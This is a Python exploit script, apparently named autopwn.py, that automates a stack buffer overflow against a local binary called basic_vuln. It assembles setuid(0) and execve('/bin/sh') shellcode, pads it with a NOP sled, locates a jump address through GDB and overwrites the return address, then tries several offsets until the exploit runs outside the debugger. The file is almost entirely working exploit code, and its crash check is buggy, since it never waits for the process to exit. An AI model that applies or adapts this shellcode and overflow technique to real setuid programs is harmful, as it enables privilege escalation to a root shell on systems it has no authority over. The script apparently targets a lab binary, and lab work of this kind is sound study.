#!/usr/bin/env python3

# Note this script is a work in progress and has not been fully tested yet...

# to install dependencies run:
# python3 -m pip install --upgrade pwntools
# python3 -m pip install --upgrade pygdbmi

import sys

PYTHON3 = sys.version_info.major == 3
if not PYTHON3:
  print("Run this script with: 'python3 autopwn.py'")
  sys.exit(-1)

import os
import subprocess
from pwn import *
from pygdbmi.gdbcontroller import GdbController

# set path to target program
program = "./basic_vuln"
buffer_length = 64

# set the OS and architecture target by inspecting the binary
context.binary = program

# move the stack pointer father down the stack
# added because the pushes in the shellcode were
# pushing over the shellcode and causing a segfault
shellcode = asm("add rsp,0x40")

# call setuid(0) and then call execve("/bin/sh")
# shellcode from: http://shell-storm.org/shellcode/files/shellcode-77.php
# x64 disassembly from: https://defuse.ca/online-x86-assembler.htm
shellcode += asm("xor rdi,rdi")
shellcode += asm("mov al,0x69")
shellcode += asm("syscall")
shellcode += asm("xor rdx,rdx")
shellcode += asm("movabs rbx,0x68732f6e69622fff")
shellcode += asm("shr rbx,0x8")
shellcode += asm("push rbx")
shellcode += asm("mov rdi,rsp")
shellcode += asm("xor rax,rax")
shellcode += asm("push rax")
shellcode += asm("push rdi")
shellcode += asm("mov rsi,rsp")
shellcode += asm("mov al,0x3b")
shellcode += asm("syscall")
shellcode += asm("push 0x1")
shellcode += asm("pop rdi")
shellcode += asm("push 0x3c")
shellcode += asm("pop rax")
shellcode += asm("syscall")

print("Shellcode Length: " + str(len(shellcode)) + " bytes")

nop_sled = asm("nop") * (buffer_length - len(shellcode))

print("NOP Sled Length: " + str(len(nop_sled)) + " bytes")

# exploit template
# 64 bytes buffer
# 8 bytes RBP overwrite
# 8 bytes RIP overwrite (leaving highest 2 bytes zero'd for 6 byte virtual address)
exploit_template = "A"*buffer_length + "B"*8 + "C"*6 

# run GDB and get jump target
# note: pwntools also a GDB wrapper, but gdbmi seemed easier to work with in my opinion
# pwntools gdb: https://docs.pwntools.com/en/stable/gdb.html
# gdbmi: https://pypi.org/project/pygdbmi/
gdbmi = GdbController(verbose=False)
response = gdbmi.write("file " + program)
response = gdbmi.write("unset env LINES")
response = gdbmi.write("unset env COLUMNS")
response = gdbmi.write("break *main+47")
response = gdbmi.write("run " + exploit_template)
response = gdbmi.write("print (void*) &buf + (" + str(len(nop_sled)) + "/2)")
# jump target is the 6th response (not counting starting gdb)
# the output of gdb is stored in the payload field
# then we must parse the substring to remove the "$1 = (void *) "
jump_target = response[6]["payload"][len("$1 = (void *) "):]
response = gdbmi.exit()

print("Debugger Jump Target (center of NOP Sled): " + jump_target)

# use an 8-byte filler of "AAAAAAAA" to overwrite the base pointer 
rbp = b"A" * 8

# overwrite RIP with the jump target address found in GDB
# jump target is aimed at the center of the NOP sled
# this also converts the jump target to little endian form
# note: p64 is going to output zero bytes for the two most
# significant bytes, but strcpy will stop copying at the first
# zero byte anyway so this does not matter
rip = p64(int(jump_target,16))

exploit = nop_sled + shellcode + rbp + rip

def save(what, where):
  with open(where, "wb") as f:
    f.write(what)

print("GDB Exploit:")
print(hexdump(exploit))
save(exploit, "gdb_exploit")

def causes_crash(cmd):
  proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
  return proc.returncode != 0

def try_exploit(offset, positive):
  if positive:
    print("Trying Jump Target + " + str(byte_offset) + " bytes")
    rip = p64(int(jump_target,16) + byte_offset)
  else:
    print("Trying Jump Target - " + str(byte_offset) + " bytes")
    rip = p64(int(jump_target,16) - byte_offset)
  exploit = nop_sled + shellcode + rbp + rip
  save(exploit, "exploit_" + str(offset))
  if not causes_crash("./basic_vuln $(cat exploit_" + str(offset) + ")"):
    print("Exploit:")
    print(hexdump(exploit))
    sys.exit(0)

max_byte_offset = 20
for byte_offset in range(max_byte_offset + 1):
  try_exploit(byte_offset, True)
  #try_exploit(byte_offset, False)

print("Failed to find exploit that worked outside the debugger searching with up to +/- " + str(max_byte_offset) + " bytes")
sys.exit(-1)
